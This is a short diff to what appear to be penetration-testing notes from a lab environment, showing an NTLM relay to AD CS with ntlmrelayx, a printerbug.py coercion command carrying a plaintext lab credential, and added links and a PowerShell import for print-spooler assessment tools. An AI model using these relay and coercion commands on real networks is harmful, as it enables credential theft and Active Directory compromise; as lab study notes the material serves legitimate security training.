@@ -1489,6 +1489,9 @@ $ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2
 ```
 https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 $ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+https://github.com/itzvenom/Security-Assessment-PS
+https://github.com/NotMedic/NetNTLMtoSilverTicket
+PS C:\> Import-Module .\SecurityAssessment.ps1
 PS C:\> Get-SpoolStatus -ComputerName <hostname>
 ```
 
